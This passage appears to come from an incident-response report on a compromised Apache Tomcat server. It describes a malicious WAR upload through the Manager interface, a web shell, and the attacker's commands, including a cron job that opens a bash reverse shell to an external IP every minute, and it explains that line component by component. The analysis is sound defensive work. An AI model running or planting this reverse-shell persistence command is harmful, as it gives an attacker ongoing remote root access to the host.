### 4.4 Malicious File Upload Analysis

* **Upload Session:** 18:22:14 UTC
* **HTTP Request Analysis:**
```
POST /manager/html/upload;jsessionid=0DE586F27B2F48D0CA045F731E0E9E71?org.apache.catalina.filters.CSRF_NONCE=83EDF4E2462ECC725BAF342DD7A46974 HTTP/1.1
```

**Malicious File Details:**
* **Filename:** `JXQOZY.war`
* **File Type:** Web Application Archive (WAR)
* **Purpose:** Web shell deployment
* **Upload Method:** Tomcat Manager interface abuse
* **Session ID:** `0DE586F27B2F48D0CA045F731E0E9E71`

**Deployment Characteristics:**
* **Automatic Deployment:** Tomcat auto-deployed the WAR file
* **Access Path:** `/JXQOZY/` endpoint created
* **Functionality:** Remote command execution capability
* **Persistence:** Application-level backdoor establishment

### 4.5 Web Shell Execution Analysis

* **Activation Request:** `GET /JXQOZY/ HTTP/1.1` at 18:22:23 UTC
* **Execution Context:** Web server user (initially), escalated to root

**Command Sequence Executed:**
```bash
# Initial privilege verification
whoami
# Response: root

# Working directory setup
cd /tmp
pwd
# Response: /tmp

# Persistence mechanism creation
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron

# Verification of persistence installation
crontab -l
# Response: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

### 4.6 Reverse Shell and Persistence Analysis

**Persistence Command Breakdown:**
```bash
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

**Cron Schedule Analysis:**
* `* * * * *` = Execute every minute of every hour, every day
* **Frequency:** Once per minute (60 times per hour)
* **Persistence Level:** Extremely high

**Reverse Shell Components:**
* `/bin/bash -c`: Execute bash command
* `bash -i`: Interactive bash shell
* `>&`: Redirect both stdout (standard output) and stderr (standard error)
* `/dev/tcp/14.0.0.120/443`: Create TCP connection to attacker IP on port 443
* `0>&1`: Redirect stdin (standard input) to the same connection as stdout

**Technical Mechanism:**
1. **Shell Creation:** `bash -i` creates an interactive shell
2. **Output Redirection:** `>&` sends all command output to the network connection
3. **Network Connection:** `/dev/tcp/14.0.0.120/443` establishes TCP connection to attacker
4. **Input Redirection:** `0>&1` allows attacker to send commands through the connection
5. **Stealth:** Uses port 443 (HTTPS) to blend with legitimate traffic

**Result:** Every minute, the compromised system automatically connects to the attacker's machine, providing an interactive shell with root privileges.
